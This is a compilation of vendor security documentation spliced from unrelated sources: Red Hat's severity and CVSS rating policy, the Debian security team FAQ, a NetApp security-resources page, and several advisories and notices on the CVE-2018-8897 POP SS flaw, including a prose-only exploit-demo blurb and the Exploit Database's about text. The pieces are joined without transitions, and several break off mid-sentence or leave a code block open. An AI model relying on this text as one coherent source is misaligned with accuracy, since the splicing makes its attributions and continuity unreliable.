# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

## Security Resources

With the ever prevalent threats that span todayâs landscape, NetApp continues
to derive and provide security solutions across the portfolio. Links to
security resources are found below. As always, stay tuned because just like the
threat landscape, these resources are ever changing and being updated!

#### Products and Solutions

The product and solutions resources provide guidance, recommendations, and best
practices with regard to security elements and configurations amongst the
NetApp portfolio.

##### ONTAP

ONTAP 9 Security Datasheet provides a comprehensive list of security features
and functions available in ONTAP 9 - So if the question is, âwhat are all the
security features/functions in ONTAP 9?â, This is your resource!

[Security Hardening Guide for NetApp ONTAP
9](https://www.netapp.com/us/media/tr-4569.pdf) - We humbly refer to the
Security Hardening Guide for NetApp ONTAP 9 as your key resource when it comes
to answering the question, âhow do I deploy ONTAP 9 in the most secure
fashion?â. The hardening guide provides the recommended commands and configs
necessary to enable ONTAP 9 in the most secure configuration.

[ONTAP 9 Encryption Power

* When it comes to understanding the configuration and management details of NSE and NVE,
  including deployment, certificates, onboard key management and more, the Power
  Guide is the key resource!

[ONTAP 9 Network Management
Guide](https://docs.netapp.com/us-en/ontap/pdfs/sidebar/Network_management.pdf) - While
this guide provides vast elements surrounding ONTAP networking (IPv4, v6,
IPSpaces, and more), it also captures some key security elements such as
managing SVMs, protocol restrictions and firewall configuration in addition to
control plane elements such as DNS, SNMP, FIPS configuration, and MTU details.
The Network Management Guide also shows list of ports used in ONTAP, also
listed in the hardening guide.

[ONTAP 9 Manage administrator authentication and RBAC with the
CLI](https://docs.netapp.com/us-en/ontap/authentication/)

* You can enable login accounts for ONTAP cluster administrators and storage virtual machine (SVM) administrators.
  You can also use role-based access control (RBAC) to define the capabilities of administrators.

Varonis in addressing the advanced techniques around this threat. We have
discussed and captured the solution in this joint white paper.

#### Integration and Solutions Guides

As we continue to tout the key elements of security including key management,
we understand the challenges and value of timeliness as it applies to adoption
and deployment. Due to such challenges we provide integration guides where we
walk through the configuration/provisioning of âkeyâ elements such as key
managers, FPolicy, and other security laden integration solutions.

##### Key Management

# CVE-2018-8897

Demo exploitation of the POP SS vulnerability (CVE-2018-8897), leading to unsigned code execution with kernel privilages.

* KVA Shadowing should be disabled and [the relevant security update](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8897) should be uninstalled.
* This may not work with certain hypervisors (like VMWare), which discard the pending #DB after INT3.

**Advisory ID:** NTAP-20180927-0002
**Version:**
4.0

**Last updated:**
06/14/2022

**Status:**
Final.

**CVEs:** CVE-2018-8897

Overview
#### Summary

Multiple NetApp products use x86 architecture. On x86 systems the MOV SS and POP SS instructions inhibit some debug exceptions until the next instruction has completed. This can allow the kernel context to handle debug exceptions instead of the user context. Successful exploitation of this vulnerability by a local authenticated attacker could result in disclosure of sensitive information, escalation of privilege, or cause Denial of Service (DoS).

#### Impact

Successful exploitation of this vulnerability by a local authenticated attacker could result in disclosure of sensitive information, escalation of privilege, or cause Denial of Service (DoS).

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2018%3A1351)

## Topic

An update for kernel is now available for Red Hat Enterprise Linux 6.6 Advanced Update Support and Red Hat Enterprise Linux 6.6 Telco Extended Update Support.

Red Hat Product Security has rated this update as having a security impact of Moderate. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

[Updated 10 May 2018]

The references to CVE-2017-5754 x86 (32-bit) mitigation were removed because Red Hat Enterprise Linux 6.6 Advanced Update Support and Red Hat Enterprise Linux 6.6 Telco Extended Update Support do not include support for x86 32-bit architecture. Consequently, impact rating of this erratum was changed from Important to Moderate.

## Description

The kernel packages contain the Linux kernel, the core of any Linux operating system.

Security Fix(es):

* Kernel: error in exception handling leads to DoS (CVE-2018-8897)

For more details about the security issue(s), including the impact, a CVSS score, and other related information, refer to the CVE page(s) listed in the References section.

Red Hat would like to thank Nick Peterson (Everdox Tech LLC) and Andy Lutomirski for reporting this issue.

Bug Fix(es):

* If an NFSv3 client mounted a subdirectory of an exported file system, a directory entry to the mount hosting the export was incorrectly held even after clearing the cache. Consequently, attempts to unmount the subdirectory with the umount command failed with the EBUSY error. With this update, the underlying source code has been fixed, and the unmount operation now succeeds as expected in the described situation. (BZ#1538588)
* The kernel build requirements have been updated to the GNU Compiler Collection (GCC) compiler version that has the support for Retpolines. The Retpolines mechanism is a software construct that leverages specific knowledge of the underlying hardware to mitigate the branch target injection, also known as Spectre variant 2 vulnerability described in CVE-2017-5715. (BZ#1554254)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

The system must be rebooted for this update to take effect.

## Affected Products

* Red Hat Enterprise Linux Server - AUS 6.6 x86\_64

# USN-3641-2: Linux kernel vulnerabilities

8 May 2018

Several security issues were fixed in the Linux kernel.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 12.04](/security/notices?release=precise)

## Packages

* [linux](/security/cves?package=linux) - Linux kernel
* [linux-lts-trusty](/security/cves?package=linux-lts-trusty) - Linux hardware enablement kernel from Trusty for Precise ESM

## Details

USN-3641-1 fixed vulnerabilities in the Linux kernel for Ubuntu 14.04

LTS, Ubuntu 16.04 LTS, and Ubuntu 17.10. This update provides the

corresponding updates for Ubuntu 12.04 ESM.

Nick Peterson discovered that the Linux kernel did not properly handle

debug exceptions following a MOV/POP to SS instruction. A local attacker

could use this to cause a denial of service (system crash). This issue only

affected the amd64 architecture. ([CVE-2018-8897](/security/CVE-2018-8897))

Andy Lutomirski discovered that the KVM subsystem of the Linux kernel did

not properly emulate the ICEBP instruction following a MOV/POP to SS

instruction. A local attacker in a KVM virtual machine could use this to

cause a denial of service (guest VM crash) or possibly escalate privileges

inside of the virtual machine. This issue only affected the i386 and amd64

architectures. ([CVE-2018-1087](/security/CVE-2018-1087))

Andy Lutomirski discovered that the Linux kernel did not properly perform

error handling on virtualized debug registers. A local attacker could use

this to cause a denial of service (system crash) or possibly execute

arbitrary code. ([CVE-2018-1000199](/security/CVE-2018-1000199))

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

x86/entry/64: Don't use IST entry for #BP stack

```
There's nothing IST-worthy about #BP/int3.  We don't allow kprobes
in the small handful of places in the kernel that run at CPL0 with
an invalid stack, and 32-bit kernels have used normal interrupt
gates for #BP forever.

Furthermore, we don't allow kprobes in places that have usergs while
in kernel mode, so "paranoid" is also unnecessary.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

            Xen Security Advisory CVE-2018-8897 / XSA-260
                              version 2

                 x86: mishandling of debug exceptions

UPDATES IN VERSION 2
====================

Public release.

Updated .meta file

ISSUE DESCRIPTION
=================

When switching stacks, it is critical to have a matching stack segment
